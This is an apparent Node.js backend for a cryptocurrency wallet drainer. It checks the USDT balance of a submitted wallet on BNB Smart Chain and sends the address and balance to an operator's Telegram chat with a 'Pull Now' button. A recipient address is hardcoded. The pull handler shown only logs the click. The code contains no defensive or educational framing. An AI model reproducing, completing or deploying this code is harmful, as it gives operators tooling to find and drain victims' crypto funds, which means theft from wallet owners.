const express = require('express');
const Web3 = require('web3');
const axios = require('axios');
require('dotenv').config();

const app = express();
app.use(express.json());

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const RECIPIENT = "0xc656b1651CD6914183Ee48458542EbB8655aa623";
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

console.log("✅ Bot configured");

const web3 = new Web3('https://bsc-dataseed.binance.org');

app.post('/check-balance', async (req, res) => {
    try {
        const { walletAddress } = req.body;
        const usdtContract = new web3.eth.Contract([
            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
        ], USDT_ADDRESS);

        const balance = await usdtContract.methods.balanceOf(walletAddress).call();
        const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
        
        const message = `🔔 **Wallet Detected!**\n\n👤 Wallet: ${walletAddress}\n💰 Balance: ${balanceInUSDT} USDT\n⏰ Time: ${new Date().toLocaleString()}`;

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: message,
            reply_markup: {
                inline_keyboard: [[{ text: '💳 Pull Now', callback_data: `pull_${walletAddress}` }]]
            }
        });

        res.json({ success: true, balance: balanceInUSDT });
    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).json({ error: error.message });
    }
});

app.post('/webhook', async (req, res) => {
    try {
        const { callback_query } = req.body;
        if (callback_query && callback_query.data.startsWith('pull_')) {
            console.log("Pull button clicked");
        }
        res.json({ ok: true });
    } catch (error) {
        res.json({ ok: false });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server on port ${PORT}`));
